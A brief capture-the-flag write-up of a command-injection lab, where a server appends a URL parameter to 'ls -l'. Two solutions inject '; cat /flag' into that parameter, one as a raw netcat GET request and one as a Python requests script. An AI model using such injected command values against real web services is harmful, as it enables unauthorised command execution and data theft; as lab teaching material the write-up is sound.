## ✅ what i did  
I WAY -> netcat
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
found out the only endpoint available is /mission
the server sends back the command's output
the command was built by concatenating "ls -l" + target's value from the url
if no args were passed in the url, target's value as default is "/challenge"
so the goal is to inject our crafted command as value of target in the url
-ran: '/challenge/server'
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /mission?target=bro%3B%20cat%20%2Fflag HTTP/1.1'
        'Host: challenge.localhost'
-flag popped out

II WAY -> python
-clicked start
-opened the terminal
-ran: 'vim bro'
-typed: '#!/usr/bin/env python3'
        'import requests'
        'from pwn import*'
        'context.log_level = 'error''
        'p = process("/challenge/server")'
        'time.sleep(1)'
        'url = "http://challenge.localhost:80/mission"
        'params = {'
                '"target" : "bro; cat /flag"'
        '}'
        'r = requests.get(url, params)'
        'print(r.text)'
-flag popped out

## 🧑🏾‍🏫 what this challenge teaches u
the line arg = flask.request.args.get("target", "/challenge") declare a variable called arg and assigns to it target=/challenge by default
in case no args were provided in the url
otherwise, if in the url target has a value, arg will recieve it as target=VALUE
